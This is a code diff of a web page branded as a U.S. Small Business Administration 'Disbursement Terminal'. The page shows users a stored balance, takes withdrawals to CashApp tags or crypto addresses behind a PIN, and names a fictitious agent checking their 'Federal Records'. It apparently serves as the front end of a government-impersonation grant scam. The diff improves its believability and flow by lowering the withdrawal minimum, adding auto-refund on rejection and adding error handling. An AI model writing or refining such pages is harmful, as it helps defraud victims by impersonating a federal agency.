@@ -11,32 +11,27 @@
         :root { --sba-navy: #002e6d; --sba-red: #cc0000; --bg: #f4f7f9; }
         body { background: var(--bg); font-family: 'Public Sans', sans-serif; color: #0f172a; margin: 0; -webkit-font-smoothing: antialiased; }
 
-        /* Branding */
         .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 3px solid var(--sba-navy); position: sticky; top: 0; z-index: 1000; }
-        .sba-logo-sm { width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .sba-logo-sm { width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; cursor: pointer; }
         .logo-text-sm { font-size: 12px; font-weight: 900; color: var(--sba-navy); z-index: 5; }
         .brk-top { position: absolute; top: 0; right: 0; width: 70%; height: 40%; border-top: 3px solid var(--sba-navy); border-right: 3px solid var(--sba-navy); }
         .brk-btm { position: absolute; bottom: 0; left: 0; width: 70%; height: 40%; border-bottom: 3px solid var(--sba-red); border-left: 3px solid var(--sba-red); }
 
         .app-card { background: white; border-radius: 24px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
         
-        /* Method Selector */
         .m-btn { border: 2px solid #e2e8f0; border-radius: 15px; padding: 12px 5px; cursor: pointer; text-align: center; transition: 0.3s; background: #fff; }
         .m-btn.active { border-color: var(--sba-navy); background: #f0f7ff; box-shadow: 0 4px 12px rgba(0,46,109,0.1); }
         .m-btn i { font-size: 18px; margin-bottom: 6px; display: block; color: #64748b; }
         .m-btn.active i { color: var(--sba-navy); }
         .m-btn span { font-size: 9px; font-weight: 900; text-transform: uppercase; display: block; }
 
-        /* Inputs */
         .label-text { font-size: 9px; font-weight: 900; color: #64748b; text-transform: uppercase; margin-bottom: 6px; display: block; margin-left: 4px; }
         .s-input { width: 100%; height: 50px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 14px; font-weight: 700; margin-bottom: 15px; outline: none; transition: 0.3s; }
         .s-input:focus { border-color: var(--sba-navy); background: #fff; }
 
-        /* Buttons */
         .btn-fed { background: var(--sba-navy); color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 60px; border-radius: 15px; border-bottom: 5px solid #001530; cursor: pointer; font-size: 13px; margin-top: 10px; }
         .btn-success { background: #10b981; color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #065f46; cursor: pointer; }
         
-        /* Rejection Box */
         .decline-reason { background: #fff1f2; border-left: 5px solid #e11d48; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
 
         #loader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
@@ -50,7 +45,7 @@
     </div>
 
     <header class="header-container">
-        <div class="sba-logo-sm"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+        <div class="sba-logo-sm" onclick="location.href='dashboard.html'"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
         <div class="ml-3">
             <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement Terminal</h1>
             <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter">Port 7-B Secured</p>
@@ -119,7 +114,7 @@
             <div id="pendingView" class="hidden text-center py-10">
                 <div class="w-16 h-16 border-4 border-[#002e6d] border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                 <h3 class="font-black text-sm uppercase italic">Verification Pending</h3>
-                <p class="text-[10px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">Agent Sarah Miller is cross-referencing this disbursement with your IRS Tax Profile.</p>
+                <p class="text-[10px] text-slate-500 font-bold mt-3 px-6 uppercase leading-relaxed">Agent Sarah Miller is cross-referencing this disbursement with your Federal Records.</p>
                 <div class="mt-8 pt-6 border-t border-slate-100">
                     <p class="text-[8px] font-black text-slate-300 uppercase">Reference ID</p>
                     <p class="text-[10px] font-mono font-bold text-slate-600" id="ref-id">---</p>
@@ -176,20 +171,23 @@
                 views.forEach(v => document.getElementById(v).classList.add('hidden'));
                 document.getElementById('reason-box').classList.add('hidden');
 
+                const status = d.withdrawStatus || "IDLE";
+
                 if(!pin) {
                     document.getElementById('setupView').classList.remove('hidden');
-                } else if(d.withdrawStatus === 'SUCCESSFUL' || d.withdrawStatus === 'APPROVED') {
+                } else if(status === 'SUCCESSFUL' || status === 'APPROVED') {
                     document.getElementById('successView').classList.remove('hidden');
-                } else if(d.withdrawStatus === 'PENDING') {
+                } else if(status === 'PENDING') {
                     document.getElementById('pendingView').classList.remove('hidden');
-                } else if(d.withdrawStatus === 'DECLINED' || d.withdrawStatus === 'FAILED') {
-                    // REFUND LOGIC: If declined, return money and clear status
+                } else if(status === 'DECLINED' || status === 'REJECTED') {
+                    // AUTO-REFUND IF REJECTED
                     if(currentAmt > 0) {
                         await updateDoc(doc(db, "users", user.uid), {
                             balance: increment(currentAmt),
                             withdrawAmount: 0,
                             withdrawStatus: "IDLE"
                         });
+                        return; // Let the next snapshot update the UI
                     }
                     document.getElementById('formView').classList.remove('hidden');
                     if(d.withdrawNote) {
@@ -224,7 +222,7 @@
             const amt = Number(document.getElementById('w_amt').value);
             const wPin = document.getElementById('w_pin').value;
 
-            if(!amt || amt <= 50) return alert("Minimum withdrawal is $50");
+            if(!amt || amt < 10) return alert("Minimum withdrawal is $10");
             if(amt > bal) return alert("Insufficient Allocation Balance");
             if(wPin !== pin) return alert("Incorrect Security Pin");
 
@@ -236,14 +234,20 @@
             else if(method === 'CASHAPP') details = `CASHAPP: ${document.getElementById('c_tag').value}`;
             else details = `CRYPTO: ${document.getElementById('cr_addr').value}`;
 
-            await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                balance: increment(-amt),
-                withdrawAmount: amt,
-                withdrawStatus: "PENDING",
-                withdrawMethod: method,
-                withdrawDetails: details,
-                withdrawDate: new Date().toLocaleString()
-            });
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    balance: increment(-amt),
+                    withdrawAmount: amt,
+                    withdrawStatus: "PENDING",
+                    withdrawMethod: method,
+                    withdrawDetails: details,
+                    withdrawDate: new Date().toLocaleString()
+                });
+            } catch (e) {
+                alert("Transmission failed. Please check your network.");
+                document.getElementById('sendBtn').innerText = "Transmit to Audit Office";
+                document.getElementById('sendBtn').disabled = false;
+            }
         };
     </script>
 </body>
